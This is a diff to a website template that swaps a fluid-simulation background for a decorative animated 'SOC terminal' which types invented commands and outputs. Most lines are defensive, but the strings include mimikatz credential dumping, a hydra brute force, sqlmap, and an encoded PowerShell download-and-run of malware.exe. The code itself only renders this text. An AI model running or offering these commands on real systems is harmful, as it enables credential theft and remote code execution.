@@ -28,13 +28,13 @@
         <i class="{{ t.icon }} me-2 text-{{ t.color }}" style="font-size:0.75rem;"></i>{{ t.title }}
     </a>
     {% endfor %}
-    <hr class="text-secondary">
-    <a href="https://github.com/socbymoz" target="_blank" class="d-block py-2 px-2 rounded text-decoration-none text-secondary small" style="transition:.2s;" onmouseover="this.style.background='#1f2937'" onmouseout="this.style.background='transparent'">
-        <i class="bi bi-github me-2"></i>Built by socbymoz
-    </a>
 </div>
 
 <div id="sidebarOverlay" onclick="toggleSidebar()" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;display:none;background:rgba(0,0,0,0.5);"></div>
+
+<a href="https://github.com/socbymoz" target="_blank" class="text-decoration-none" style="position:fixed;bottom:16px;right:16px;z-index:1000;background:rgba(17,24,39,0.7);border:1px solid #374151;color:#9ca3af;padding:8px 14px;border-radius:20px;font-size:0.8rem;transition:.2s;" onmouseover="this.style.borderColor='#0d6efd';this.style.color='#0d6efd'" onmouseout="this.style.borderColor='#374151';this.style.color='#9ca3af'">
+    <i class="bi bi-github me-1"></i>Built by socbymoz
+</a>
 
 <div class="main-content" style="position:relative;z-index:1;padding:20px;max-width:900px;margin:0 auto;">
     {% block content %}{% endblock %}
@@ -56,234 +56,168 @@ function toggleSidebar() {
     }
 }
 
-// Canvas fluid simulation based on mouse movement
+// Code terminal running in background with typing effect
 (function() {
     const canvas = document.getElementById('fluidCanvas');
     const ctx = canvas.getContext('2d');
     let W, H;
-    const RES = 120;
-    let cols, rows;
-    let velX, velY, dens, press, div;
+    const LINE_H = 22;
+    const FONT_SIZE = 13;
+    let startY = 0;
+    const scrollSpeed = 0.3;
+    
+    const commands = [
+        { cmd: 'soc@lab:~$ tail -f /var/log/auth.log', out: 'Jun 17 08:12:34 sshd[2345]: Failed password for root from 45.33.32.156 port 51234 ssh2' },
+        { cmd: 'soc@lab:~$ grep "Accepted" /var/log/auth.log | wc -l', out: '12 successful logins (expected: ~3)' },
+        { cmd: 'soc@lab:~$ sudo tcpdump -i eth0 port 9050', out: '10:15:22.334 IP 10.10.10.50.49157 > 185.220.101.1.9050: Flags [S], seq 12345' },
+        { cmd: 'soc@lab:~$ curl -s http://10.0.0.5:9200/_cat/indices', out: 'yellow open syslog-2026.06.17 5 1 12458 0 45mb 45mb' },
+        { cmd: 'soc@lab:~$ nmap -sV 192.168.1.0/24', out: '22/tcp open ssh OpenSSH 7.4\n80/tcp open http Apache 2.4.6\n3389/tcp open ms-wbt-server Microsoft RDP' },
+        { cmd: 'soc@lab:~$ powershell Get-EventLog -LogName Security -InstanceId 4625 | select -first 5', out: 'Index Time EntryType Source InstanceID\n----- ---- --------- ------ ----------\n12458 Jun 17 Failure Audit Microsoft-Windows-Security-Auditing 4625' },
+        { cmd: 'soc@lab:~$ wazuh-agent -c "syscheck_scan"', out: '[SCAN] Starting integrity scan...\n[SCAN] /etc/passwd: modified (expected)\n[SCAN] /var/www/html/shell.php: NEW (critical)' },
+        { cmd: 'soc@lab:~$ zeek -r capture.pcap traffic-log', out: '12543 HTTP requests\n342 HTTPS connections\n12 DNS queries to known malicious domains\n3 Tor connections detected' },
+        { cmd: 'soc@lab:~$ vol.py -f mem.dump windows.pslist', out: 'PID PPID Name\n 1234 5678 powershell.exe (suspicious parent: WINWORD.EXE)\n 5678 1234 cmd.exe' },
+        { cmd: 'soc@lab:~$ yara -s -r malware_rules.yar /tmp/suspicious.exe', out: 'cobalt_strike_beacon /tmp/suspicious.exe\n0x4e20: $a1: 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00' },
+        { cmd: 'soc@lab:~$ sha256sum suspicious.exe', out: 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b' },
+        { cmd: 'soc@lab:~$ curl -X GET "https://virustotal.com/api/v3/files/a1b2c3d4e5f6a7b8c9d0" -H "x-apikey: ***"', out: '{"data":{"attributes":{"last_analysis_stats":{"malicious":45,"harmless":5,"undetected":10}}}}' },
+        { cmd: 'soc@lab:~$ sudo iptables -A INPUT -s 45.33.32.156 -j DROP', out: '[ RULE ADDED ] 45.33.32.156 blocked at firewall' },
+        { cmd: 'soc@lab:~$ grep -r "password1" /var/www/html/wp-config.php', out: '/var/www/html/wp-config.php:define(\'DB_PASSWORD\', \'password1\');' },
+        { cmd: 'soc@lab:~$ python3 -c "import hashlib; print(hashlib.md5(b\'infected.exe\').hexdigest())"', out: 'd41d8cd98f00b204e9800998ecf8427e' },
+        { cmd: 'soc@lab:~$ ss -tulpn | grep ESTABLISHED | grep -v 443', out: 'tcp ESTAB 0 0 10.10.10.50:49157 185.220.101.1:9050 users:("wscript.exe",pid=2345)' },
+        { cmd: 'soc@lab:~$ schtasks /query /tn "GoogleUpdateTask" /v', out: 'Task: GoogleUpdateTask\nStatus: Running\nTask To Run: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyAC8AcABhAHkAbABvAGEAZAAnACkA' },
+        { cmd: 'soc@lab:~$ mimikatz "privilege::debug" "sekurlsa::logonpasswords"', out: 'Username: backup_admin\nDomain: CORP\nPassword: P@ssw0rd! (found in LSASS)' },
+        { cmd: 'soc@lab:~$ dmesg | tail -20', out: '[12345.678] usb 1-1: new high-speed USB device number 42\n[12345.679] New USB device found: SanDisk Cruzer Blade (suspicious)' },
+        { cmd: 'soc@lab:~$ cat /var/log/syslog | grep -c "fail\|error\|invalid"', out: 'Count: 127 (baseline: ~15/day) — anomaly detected' },
+        { cmd: 'soc@lab:~$ hydra -l admin -P rockyou.txt ssh://192.168.1.100 -t 4', out: '[22][ssh] host: 192.168.1.100 login: admin password: password1' },
+        { cmd: 'soc@lab:~$ sqlmap -u "http://testphp.vulnweb.com/products.php?id=1" --batch', out: 'Parameter: id (GET)\nType: boolean-based blind\nPayload: id=1\' AND 1=1--' },
+        { cmd: 'soc@lab:~$ base64 -d <<< "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACcAKQA="', out: 'IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.1.2/malware.exe\')' },
+        { cmd: 'soc@lab:~$ systemctl status wazuh-agent', out: 'wazuh-agent.service - Wazuh agent\nActive: active (running)\nAlerts sent today: 1,245' },
+        { cmd: 'soc@lab:~$ ssdeep -b -l /var/www/html/uploads/', out: 'ssdeep,1.1--blocksize:hash:hash,filename\n98304:rK4sN8jX0pQ2mW5vL9fR6tZ1yA3c:rK4sN8jX0pQ /uploads/shell.php' },
+        { cmd: 'soc@lab:~$ diff -r /etc/ /backup/etc/', out: 'Only in /etc/: shadow.new\nOnly in /backup/etc/: cron.deny' },
+    ];
+    
+    let lines = [];
+    let currentCmd = 0;
+    let charIdx = 0;
+    let phase = 'typing'; // typing -> output -> wait -> next
+    let outputLine = '';
+    let outputCharIdx = 0;
+    let waitTimer = 0;
+    let scrollOffset = 0;
     
     function resize() {
         W = canvas.width = window.innerWidth;
         H = canvas.height = window.innerHeight;
-        cols = Math.ceil(W / RES) + 1;
-        rows = Math.ceil(H / RES) + 1;
-        const size = cols * rows;
-        velX = new Float32Array(size);
-        velY = new Float32Array(size);
-        dens = new Float32Array(size);
-        press = new Float32Array(size);
-        div = new Float32Array(size);
     }
     
-    function idx(x, y) { return x + y * cols; }
-    function lerp(a, b, t) { return a + (b - a) * t; }
-    function clamp(v, mn, mx) { return Math.max(mn, Math.min(mx, v)); }
-    
-    function addDensity(x, y, amount) {
-        const gx = Math.floor(x / RES);
-        const gy = Math.floor(y / RES);
-        if (gx < 0 || gx >= cols || gy < 0 || gy >= rows) return;
-        dens[idx(gx, gy)] += amount;
-    }
-    
-    function addVelocity(x, y, ax, ay) {
-        const gx = Math.floor(x / RES);
-        const gy = Math.floor(y / RES);
-        if (gx < 0 || gx >= cols || gy < 0 || gy >= rows) return;
-        const i = idx(gx, gy);
-        velX[i] += ax;
-        velY[i] += ay;
-    }
-    
-    function diffuse(b, x, x0, dt) {
-        const a = dt * 0.1 * cols * rows;
-        for (let k = 0; k < 8; k++) {
-            for (let j = 1; j < rows - 1; j++) {
-                for (let i = 1; i < cols - 1; i++) {
-                    const n = idx(i, j);
-                    x[n] = (x0[n] + a * (x[idx(i-1,j)] + x[idx(i+1,j)] + x[idx(i,j-1)] + x[idx(i,j+1)])) / (1 + 4 * a);
+    function typeChar() {
+        const cmd = commands[currentCmd];
+        if (charIdx < cmd.cmd.length) {
+            charIdx++;
+            const promptLine = cmd.cmd.substring(0, charIdx);
+            if (lines.length === 0 || lines[lines.length-1] !== promptLine) {
+                if (lines.length > 0 && lines[lines.length-1].startsWith('soc@lab')) {
+                    lines[lines.length-1] = promptLine;
+                } else {
+                    lines.push(promptLine);
                 }
             }
-            setBoundary(b, x);
+            if (lines.length > 150) lines.shift();
+        } else {
+            phase = 'output';
+            outputCharIdx = 0;
+            outputLine = '';
         }
     }
     
-    function advect(b, d, d0, velX, velY, dt) {
-        const dt0 = dt * Math.max(cols, rows);
-        for (let j = 1; j < rows - 1; j++) {
-            for (let i = 1; i < cols - 1; i++) {
-                const n = idx(i, j);
-                const x = i - dt0 * velX[n];
-                const y = j - dt0 * velY[n];
-                const xi = clamp(x, 0.5, cols - 1.5);
-                const yi = clamp(y, 0.5, rows - 1.5);
-                const xf = Math.floor(xi);
-                const yf = Math.floor(yi);
-                const xfrac = xi - xf;
-                const yfrac = yi - yf;
-                const i00 = idx(xf, yf);
-                const i10 = idx(xf+1, yf);
-                const i01 = idx(xf, yf+1);
-                const i11 = idx(xf+1, yf+1);
-                d[n] = (1-xfrac)*(1-yfrac)*d0[i00] + xfrac*(1-yfrac)*d0[i10] + (1-xfrac)*yfrac*d0[i01] + xfrac*yfrac*d0[i11];
+    function typeOutput() {
+        const out = commands[currentCmd].out;
+        if (outputCharIdx < out.length) {
+            outputCharIdx++;
+            outputLine = out.substring(0, outputCharIdx);
+            const idx = lines.length - 1;
+            if (lines[idx] && !lines[idx].startsWith('soc@lab')) {
+                lines[lines.length-1] = outputLine;
+            } else {
+                lines.push(outputLine);
             }
+            if (lines.length > 150) lines.shift();
+        } else {
+            phase = 'wait';
+            waitTimer = 0;
         }
-        setBoundary(b, d);
     }
     
-    function setBoundary(b, x) {
-        for (let i = 1; i < cols - 1; i++) {
-            x[idx(i,0)] = b === 2 ? -x[idx(i,1)] : x[idx(i,1)];
-            x[idx(i,rows-1)] = b === 2 ? -x[idx(i,rows-2)] : x[idx(i,rows-2)];
-        }
-        for (let j = 1; j < rows - 1; j++) {
-            x[idx(0,j)] = b === 1 ? -x[idx(1,j)] : x[idx(1,j)];
-            x[idx(cols-1,j)] = b === 1 ? -x[idx(cols-2,j)] : x[idx(cols-2,j)];
-        }
-        x[idx(0,0)] = (x[idx(1,0)] + x[idx(0,1)]) * 0.5;
-        x[idx(cols-1,0)] = (x[idx(cols-2,0)] + x[idx(cols-1,1)]) * 0.5;
-        x[idx(0,rows-1)] = (x[idx(1,rows-1)] + x[idx(0,rows-2)]) * 0.5;
-        x[idx(cols-1,rows-1)] = (x[idx(cols-2,rows-1)] + x[idx(cols-1,rows-2)]) * 0.5;
-    }
+    let lastTypeTime = 0;
+    const typeSpeed = 35;
+    const outputSpeed = 15;
+    const WAIT_DURATION = 2500;
     
-    function project(velX, velY, press, div) {
-        for (let j = 1; j < rows - 1; j++) {
-            for (let i = 1; i < cols - 1; i++) {
-                const n = idx(i, j);
-                div[n] = (velX[idx(i+1,j)] - velX[idx(i-1,j)] + velY[idx(i,j+1)] - velY[idx(i,j-1)]) * -0.5 / Math.max(cols, rows);
-                press[n] = 0;
+    function update() {
+        const now = Date.now();
+        if (phase === 'typing' && now - lastTypeTime > typeSpeed) {
+            lastTypeTime = now;
+            typeChar();
+        } else if (phase === 'output' && now - lastTypeTime > outputSpeed) {
+            lastTypeTime = now;
+            typeOutput();
+        } else if (phase === 'wait') {
+            waitTimer += 16;
+            if (waitTimer > WAIT_DURATION) {
+                currentCmd = (currentCmd + 1) % commands.length;
+                charIdx = 0;
+                phase = 'typing';
+                // scroll a bit to show new content
             }
         }
-        setBoundary(0, div);
-        setBoundary(0, press);
-        for (let k = 0; k < 20; k++) {
-            for (let j = 1; j < rows - 1; j++) {
-                for (let i = 1; i < cols - 1; i++) {
-                    const n = idx(i, j);
-                    press[n] = (div[n] + press[idx(i-1,j)] + press[idx(i+1,j)] + press[idx(i,j-1)] + press[idx(i,j+1)]) / 4;
-                }
-            }
-            setBoundary(0, press);
-        }
-        for (let j = 1; j < rows - 1; j++) {
-            for (let i = 1; i < cols - 1; i++) {
-                const n = idx(i, j);
-                velX[n] -= 0.5 * (press[idx(i+1,j)] - press[idx(i-1,j)]) * Math.max(cols, rows);
-                velY[n] -= 0.5 * (press[idx(i,j+1)] - press[idx(i,j-1)]) * Math.max(cols, rows);
-            }
-        }
-        setBoundary(1, velX);
-        setBoundary(2, velY);
-    }
-    
-    let mouseX = -1000, mouseY = -1000;
-    let prevMouseX = -1000, prevMouseY = -1000;
-    let mouseActive = false;
-    
-    window.addEventListener('mousemove', e => {
-        prevMouseX = mouseX;
-        prevMouseY = mouseY;
-        mouseX = e.clientX;
-        mouseY = e.clientY;
-        mouseActive = true;
-    });
-    
-    window.addEventListener('touchmove', e => {
-        if (e.touches.length > 0) {
-            prevMouseX = mouseX;
-            prevMouseY = mouseY;
-            mouseX = e.touches[0].clientX;
-            mouseY = e.touches[0].clientY;
-            mouseActive = true;
-        }
-    }, { passive: true });
-    
-    let lastTime = 0;
-    function step(time) {
-        const dt = Math.min((time - lastTime) / 1000, 0.05);
-        lastTime = time;
-        
-        // Mouse interaction
-        if (mouseActive) {
-            const dx = mouseX - prevMouseX;
-            const dy = mouseY - prevMouseY;
-            const speed = Math.sqrt(dx*dx + dy*dy);
-            if (speed > 2) {
-                addDensity(mouseX, mouseY, 8);
-                addVelocity(mouseX, mouseY, dx * 0.5, dy * 0.5);
-            }
-            mouseActive = false;
-        }
-        
-        // Diffuse velocity
-        diffuse(1, velX, velX, dt);
-        diffuse(2, velY, velY, dt);
-        project(velX, velY, press, div);
-        
-        // Advect velocity
-        const velX0 = new Float32Array(velX);
-        const velY0 = new Float32Array(velY);
-        advect(1, velX, velX0, velX0, velY0, dt);
-        advect(2, velY, velY0, velX0, velY0, dt);
-        project(velX, velY, press, div);
-        
-        // Advect density
-        const dens0 = new Float32Array(dens);
-        advect(0, dens, dens0, velX, velY, dt);
-        
-        // Dissipate
-        for (let i = 0; i < dens.length; i++) {
-            dens[i] *= 0.985;
-        }
-        
-        render();
-        requestAnimationFrame(step);
+        scrollOffset += scrollSpeed;
+        if (scrollOffset > LINE_H) scrollOffset -= LINE_H;
     }
     
     function render() {
         ctx.clearRect(0, 0, W, H);
+        ctx.font = `${FONT_SIZE}px 'Courier New', monospace`;
         
-        // Color palette: dark bg with cyan/blue fluid trails
-        const palette = [
-            [0.05, 0.22, 0.45],   // dark blue
-            [0.0, 0.45, 0.7],     // medium blue
-            [0.0, 0.7, 0.85],     // cyan
-            [0.1, 0.85, 0.75],    // teal
-            [0.3, 0.2, 0.6],      // purple
-        ];
+        const visibleLines = Math.floor(H / LINE_H) + 2;
+        const startLine = Math.max(0, lines.length - visibleLines);
         
-        for (let j = 0; j < rows; j++) {
-            for (let i = 0; i < cols; i++) {
-                const d = dens[idx(i, j)];
-                if (d < 0.02) continue;
-                
-                const x = i * RES;
-                const y = j * RES;
-                const w = RES + 1;
-                const h = RES + 1;
-                const intensity = Math.min(d * 0.15, 1);
-                
-                // Pick color from palette based on position
-                const pi = (Math.sin(i * 0.3 + j * 0.2) * 0.5 + 0.5) * (palette.length - 1);
-                const pIdx = Math.floor(pi);
-                const pFrac = pi - pIdx;
-                const c0 = palette[Math.min(pIdx, palette.length - 1)];
-                const c1 = palette[Math.min(pIdx + 1, palette.length - 1)];
-                const r = lerp(c0[0], c1[0], pFrac);
-                const g = lerp(c0[1], c1[1], pFrac);
-                const b = lerp(c0[2], c1[2], pFrac);
-                
-                ctx.fillStyle = `rgba(${r*255|0},${g*255|0},${b*255|0},${intensity * 0.4})`;
-                ctx.fillRect(x, y, w, h);
+        for (let i = 0; i < visibleLines; i++) {
+            const li = startLine + i;
+            if (li >= lines.length) break;
+            const line = lines[li];
+            if (!line) continue;
+            
+            const y = (i + 1) * LINE_H - scrollOffset;
+            if (y < -LINE_H || y > H + LINE_H) continue;
+            
+            const isCmd = line.startsWith('soc@lab');
+            const isOutput = !isCmd && line.length > 0;
+            
+            // Dim effect based on position
+            const distFromCenter = Math.abs(y - H/2) / (H/2);
+            const alpha = Math.max(0.08, 0.25 * (1 - distFromCenter * 0.7));
+            
+            if (isCmd) {
+                // Command line: green prompt + dim command
+                ctx.fillStyle = `rgba(0, 200, 83, ${alpha})`; // green prompt
+                ctx.fillText('soc@lab:~$ ', 30, y);
+                ctx.fillStyle = `rgba(200, 200, 200, ${alpha * 1.2})`;
+                const cmdText = line.substring(12);
+                ctx.fillText(cmdText, 30 + ctx.measureText('soc@lab:~$ ').width, y);
+            } else if (isOutput) {
+                ctx.fillStyle = `rgba(100, 180, 255, ${alpha * 0.9})`; // blue output
+                ctx.fillText(line, 30, y);
             }
         }
     }
     
+    function loop() {
+        update();
+        render();
+        requestAnimationFrame(loop);
+    }
+    
     resize();
-    requestAnimationFrame(step);
+    loop();
 })();
 </script>
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
